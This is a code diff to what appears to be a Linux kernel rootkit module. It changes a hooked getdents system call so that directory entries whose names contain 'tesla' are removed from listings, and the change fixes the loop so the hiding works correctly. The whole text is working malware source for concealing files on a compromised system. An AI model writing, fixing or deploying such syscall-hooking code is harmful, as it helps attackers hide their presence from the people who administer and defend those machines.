@@ -20,10 +20,11 @@ MODULE_LICENSE("GPL v2");
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
   int totalSize = orig_getdents(fd, dirp, count);
+  int remainingSize = totalSize;
+  int l;
 
   struct linux_dirent *p1 = kmalloc(totalSize, GFP_KERNEL);
   struct linux_dirent *p2 = 0;
-  int i = 0;
 
   if (copy_from_user(p1, dirp, totalSize) != 0) {
     kfree(p1);
@@ -32,13 +33,14 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 
   p2 = p1;
 
-  while (i < totalSize && (p2->d_reclen != 0)) {
+  while (remainingSize > 0) {
+    l = p2->d_reclen;
+    remainingSize -= p2->d_reclen;
     if (strstr(p2->d_name, "tesla")) {
-      memcpy(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), totalSize - p2->d_reclen);
-      totalSize = totalSize - (p2->d_reclen);
+      memcpy(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), remainingSize);
+      totalSize -= l;
     } else {
       p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
-      i = i + (p2->d_reclen);
     }
   }
 
